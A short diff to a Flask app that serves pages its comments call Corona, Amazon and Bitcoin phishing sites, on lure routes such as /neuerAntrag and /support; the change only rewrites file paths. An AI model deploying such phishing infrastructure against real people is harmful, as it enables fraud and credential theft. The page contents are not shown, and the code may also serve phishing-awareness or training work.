@@ -1,35 +1,45 @@
 from flask import Flask, request, send_from_directory, send_file
+from os import path
+
 # set the project root directory as the static folder, you can set others.
 app = Flask(__name__, static_url_path='')
 app.config.from_pyfile('config.py', silent=True)
 app._static_folder = ""
 
+t_path = path.abspath(path.dirname(__file__))
+html_folder_path = path.join(t_path, 'html')
+
 # Corona phishing site
 
 @app.route('/neuerAntrag')
 def corona_ger():
-    return send_file(r'html\ger\corona.html')
+    file_path = path.join(html_folder_path, 'ger/corona.html')
+    return send_file(file_path)
 
 @app.route('/register')
 def corona_eng():
-    return send_file(r'html\eng\corona.html')
+    file_path = path.join(html_folder_path, 'eng/corona.html')
+    return send_file(file_path)
 
 # Amazon phishing site
 
 @app.route('/support')
 def amazon_eng():
-    return send_file(r'html\eng\amazon.html')
+    file_path = path.join(html_folder_path, 'eng/amazon.html')
+    return send_file(file_path)
 
 # Bitcoin phishing site
 
 @app.route('/bitcoin')
 def bitcoin():
-    return send_file(r'html\bitcoin.html')
+    file_path = path.join(html_folder_path, 'bitcoin.html')
+    return send_file(file_path)
 
 
 @app.route('/bitcoin/bitcoin.png')
 def bitcoin_image():
-    return send_file(r'html\bitcoin.png')
+    file_path = path.join(html_folder_path, 'bitcoin.png')
+    return send_file(file_path)
 
 
 if __name__ == "__main__":
